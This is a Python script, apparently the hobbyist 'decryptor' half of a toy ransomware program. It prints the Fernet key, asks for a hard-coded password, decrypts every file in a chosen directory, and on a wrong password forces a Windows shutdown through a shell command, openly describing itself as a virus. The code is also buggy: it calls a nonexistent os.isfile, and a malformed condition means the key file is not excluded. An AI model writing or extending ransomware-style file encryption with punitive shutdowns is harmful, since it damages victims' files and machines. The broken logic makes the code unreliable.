import os
from time import sleep
from cryptography.fernet import Fernet
import subprocess

if __name__ == '__main__':
    brainrotWord = "sigma"

    with open("encryptionKey.key", "rb") as keyFile:
        key = keyFile.read()
    fernet = Fernet(key)

    print(f"Decryption Key: {key}")

    def run(cmd):
        subprocess.run(cmd, shell=True, capture_output=False)

    def decrypt(fpath):
        with open(rf'{fpath}', 'rb') as encryptedFile:
            encrypted = encryptedFile.read()
	
        decrypted = fernet.decrypt(encrypted)
		
        with open(rf'{fpath}', 'wb') as encryptedFile:
            encryptedFile.write(decrypted)

    def chooseDir():
        dpath = input("Input directory path:\n")
        while os.path.isdir(dpath) == False:
            if os.path.exists(dpath):
                if os.isfile(dpath):
                    print(f"{dpath} is a file and not a directory!")
                    dpath = input("Input directory path:\n")
                else:
                    raise Exception(f"wtf happened here: path provided ({dpath}) is not an existing directory, is not an existing file, but also somehow exists???")
            elif os.path.exists(dpath) == False:
                print(f"{dpath} does not exist!")
                dpath = input("Input directory path:\n")
        return dpath

    password = input("Please enter the correct password to decrypt your files:\n")

    def decryptDir(dpath):
        os.chdir(dpath)
        for parent, dirs, files in os.walk('.'):
            print(files) #testing purposes, remember to remove this line
            for fname in files:
                if fname != 'fileEncryptVirus.txt' and 'encryptionkey.key':
                    fpath = os.path.join(parent, fname)
                    decrypt(fpath)                                      #testing purposes, remember to remove this line
                    print(f"Decrypted {fname} at {fpath}")              #testing purposes, remember to remove this line
                    print("--------------------------------------------------------------------------------------------------------------------------------")

    if password == brainrotWord:
        print("Correct password!")
        dpath = chooseDir()
        print("Starting descryption...")
        sleep(0.4)
        decryptDir(dpath)
        sleep(1)
        print("\nDecryption completed successfully! Have a nice day!")
        sleep(3)
    elif password!= brainrotWord:
        print("Incorrect password! Also cuz this is meant to be a virus, your computer will soon shutdown. You can abort it if you make it in time!")
        run('shutdown /s /t 3 /c "incorrect password lol"')
        sleep(4)


